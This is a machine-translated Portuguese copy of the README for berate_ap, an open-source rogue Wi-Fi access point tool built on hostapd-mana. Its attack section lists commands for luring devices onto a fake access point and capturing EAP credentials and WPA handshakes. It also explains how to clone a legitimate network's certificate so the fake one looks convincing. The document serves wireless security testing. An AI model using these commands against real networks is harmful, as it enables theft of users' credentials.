---
title: "berate-ap — documentação oficial"
type: "official-documentation"
tool: "berate-ap"
status: "translated-machine"
reviewed: "2026-10-26"
language: "pt-BR"
tags: ["documentation", "tool/berate-ap"]
cssclasses: ["fieldbook"]
source_url: "https://github.com/sensepost/berate_ap/blob/ed4ba9b94ae901ea1112640ed1b6d4f4d5930c51/README.md"
source_commit: "ed4ba9b94ae901ea1112640ed1b6d4f4d5930c51"
source_sha256: "19288bc9dd4996d17c85b5528e7500be137f092825c322151b88aaa4ce2f7ee2"
license_spdx: "BSD-2-Clause"
human_review: "pending"
source_scope: "Repository root README and owned doc/docs/documentation Markdown or RST files; not a claim of full wiki/site coverage"
---

> Tradução automática local para português, ainda sem revisão humana integral. Estrutura e blocos de código preservados; referências externas não significam conteúdo espelhado.

# Berate_ap 
[Criar_ap](https://github.com/oblique/create_ap) foi modificado para executar redes EAP e [hostapd-mana](https://github.com/sensepost/hostapd-mana) com várias opções

<a id="setup"></a>
## Configuração
Este script requer hostapd-mana para estar no caminho.

Isso pode ser feito adicionando o binário ao seu caminho diretamente:
```text
export PATH="$PATH:/path/to/hostapd-mana"
```
Para tornar isso permanente, você pode adicionar ao seu arquivo shells .rc

ou você pode vincular hostapd-mana a um diretório que está dentro do seu caminho
```text
cd /usr/bin
sudo ln -s /path/to/hostapd-mana hostapd-mana
```

<a id="attacks"></a>
## Ataques

Execute o Mana para enganar os usuários a se conectarem ao seu ponto de acesso. O arquivo de usuários de eap não é passado para que o arquivo de usuário de eap do mana padrão seja usado:

    berate_ap --eap --mana wlan0 eth0 MyAccessPoint 
    
Os ataques do Mana WPE não são mais feitos por padrão ao usar o `--mana` e devem ser ativados separadamente:

    berate_ap --eap --mana-wpe wlan0 eth0 MyAccessPoint
    
Outras opções de WPE Mana disponíveis são `--mana-eapsuccess` e `--mana-eaptls`, a localização do arquivo credout é por padrão `/tmp/hostapd.credout`, mas pode ser especificado com `--mana-credout <file>` (Preferível para usar o caminho completo). Mais informações sobre estes podem ser encontradas no [Hostapd-mana wiki](https://github.com/sensepost/hostapd-mana/wiki/MANA-EAP-Options-(aka-WPE)).

Executar o Mana com o [Captura WPA](https://github.com/sensepost/hostapd-mana/wiki/MANA-WPA-2-Options-(handshakes) activo. Isto requer que os ataques de mana sejam desactivados. O hcapx será colocado no `/tmp/hostapd.hccapx`, isto poderá ser especificado com o `--mana-wpaout <file>`:

    berate_ap --mana-wpa -n wlan0 <target Network Name> "ANYPASSWORD"

Executar o Mana em modo alto para mostrar aos dispositivos todos os pontos de acesso vistos pelo Mana:

    berate_ap --eap --mana --mana-loud wlan0 eth0 MyAccessPoint 

Executar Mana e ponte a conexão de rede para o seu endereço ethernet:

    berate_ap --eap --mana -m bridge wlan0 eth0 MyAccessPoint 

Executar Mana e ser mesquinho por não fornecer qualquer acesso à Internet upstream:

    berate_ap --eap --mana -n wlan0 MyAccessPoint  

<!--Run Mana and host one of each network type to catch as many people as possible.

    berate_ap --trifecta --mana wlan0 eth0 MyAccessPoint -->

<a id="more-convincing-certificate"></a>
## Certificado Mais Conventivo

Ao executar seus usuários Rogue AP pode ser apresentado com seu certificado ao autenticar, é do seu interesse fazer seu certificado parecer tão semelhante aos APs legítimos quanto possível. Ao executar um ponto de acesso EAP `berate_ap` irá pedir que você preencha campos para gerar o certificado a ser usado, tente valores sensíveis de entrada.
Para obter os valores do certificado em uso pelo AP legítimo, use [este script](https://gist.github.com/singe/40bda2a1772aaf4903515cc4e436afe5#gistcomment-2848828) para extrair o certificado de uma captura de pacotes:
```text
./extract_EAP.sh -r <capture file>
```
ou interface no modo monitor:
```text
airmon-ng start <interface> <channel>
./extract_EAP.sh -i <interface>
```
você pode então ver o certificado com:
```text
openssl x509 -text -inform der -in <capturedcert>.der
```
O que permitirá que você veja os valores definidos no certificado para que com berate você possa gerar um AP mais atraente.

<a id="features"></a>
## Características
* Crie um AP (Ponto de Acesso) em qualquer canal.
* Escolha uma das seguintes criptografias: WPA, WPA2, WPA/WPA2, Open (sem criptografia).
* Suporte para configurações empresariais
* Esconde o teu SSID.
* Desactivar a comunicação entre clientes (isolamento de clientes).
* Suporte IEEE 802.11n & 802.11ac
* Métodos de partilha da Internet: NATed ou Bridged ou None (sem partilha da Internet).
* Escolha o IP do Gateway AP (apenas para os métodos de partilha de Internet 'NATed' e 'Nenhum').
* Você pode criar um AP com a mesma interface que você está recebendo sua conexão com a Internet.
* Você pode passar seu SSID e senha através de pipe ou através de argumentos (veja exemplos).


<a id="dependencies"></a>
## Dependência
<a id="general"></a>
### Geral
* bash (para executar este script)
* util-linux (para o getopt)
* procps ou procps-ng
* hostapd
* iproute2
* iw
* iwconfig (você só precisa disso se 'iw' não conseguir reconhecer seu adaptador)
* hanged (opcional)

<a id="for-nated-or-none-internet-sharing-method"></a>
### Para o método de partilha da Internet «NATed» ou «nenhuma»
* dnsmasq
* iptables


<a id="installation"></a>
## Instalação
<a id="generic"></a>
### Genérico
    git clone https://github.com/sensepost/berate_ap

<a id="examples"></a>
## Exemplos
<a id="no-passphrase-open-network"></a>
### Sem frase- senha (rede aberta):
    berate_ap wlan0 eth0 MyAccessPoint

<a id="wpa--wpa2-passphrase"></a>
### WPA + WPA2 frase- senha:
    berate_ap wlan0 eth0 MyAccessPoint MyPassPhrase

<a id="ap-without-internet-sharing"></a>
### AP sem partilha da Internet:
    berate_ap -n wlan0 MyAccessPoint MyPassPhrase

<a id="bridged-internet-sharing"></a>
### Partilha interligada da Internet:
    berate_ap -m bridge wlan0 eth0 MyAccessPoint MyPassPhrase

<a id="bridged-internet-sharing-pre-configured-bridge-interface"></a>
### Compartilhamento da Internet ponte (interface de ponte pré-configurada):
    berate_ap -m bridge wlan0 br0 MyAccessPoint MyPassPhrase

<a id="internet-sharing-from-the-same-wifi-interface"></a>
### Compartilhamento de Internet a partir da mesma interface WiFi:
    berate_ap wlan0 wlan0 MyAccessPoint MyPassPhrase

<a id="choose-a-different-wifi-adapter-driver"></a>
### Escolha um driver adaptador de WiFi diferente
    berate_ap --driver rtl871xdrv wlan0 eth0 MyAccessPoint MyPassPhrase

<a id="no-passphrase-open-network-using-pipe"></a>
### Nenhuma frase- senha (rede aberta) usando o tubo:
    echo -e "MyAccessPoint" | berate_ap wlan0 eth0

<a id="wpa--wpa2-passphrase-using-pipe"></a>
### WPA + WPA2 frase- senha usando tubo:
    echo -e "MyAccessPoint\nMyPassPhrase" | berate_ap wlan0 eth0

<a id="enable-ieee-80211n"></a>
### Activar o IEEE 802.11n
    berate_ap --ieee80211n --ht_capab '[HT40+]' wlan0 eth0 MyAccessPoint MyPassPhrase

<a id="client-isolation"></a>
### Isolamento do Cliente:
    berate_ap --isolate-clients wlan0 eth0 MyAccessPoint MyPassPhrase

<a id="enterprise-network-built-in-radius"></a>
### Rede empresarial integrada RADIUS
    berate_ap --eap --eap-user-file /tmp/users.eap_hosts --eap-cert-path /tmp/certificates wlan0 eth0 MyAccessPoint 

<a id="enterprise-network-remote-radius"></a>
### RADIUS Remoto de Rede Corporativa
    berate_ap --eap --radius-server 192.168.1.1:1812 --radius-secret=P@ssw0rd wlan0 eth0 MyAccessPoint

<a id="systemd-service"></a>
## Serviço sistematizado
Usando o serviço [systemd](https://wiki.archlinux.org/index.php/systemd#Basic_systemctl_usage) persistente
<a id="start-service-immediately"></a>
### Iniciar o serviço imediatamente:
    systemctl start berate_ap

<a id="start-on-boot"></a>
### Iniciar na inicialização:
    systemctl enable berate_ap


<a id="license"></a>
## Licença
FreeBSD


---

## Procedência desta tradução

Fonte: [https://github.com/sensepost/berate_ap](https://github.com/sensepost/berate_ap/blob/ed4ba9b94ae901ea1112640ed1b6d4f4d5930c51/README.md). Licença: [BSD-2-Clause](../../99-Assets/upstream/berate-ap/LICENSE.txt). Commit: ed4ba9b94ae901ea1112640ed1b6d4f4d5930c51.

O original preservado, a lista de mudanças de apresentação e os hashes constam no manifesto do projeto. Nenhum exemplo desta documentação foi executado automaticamente.
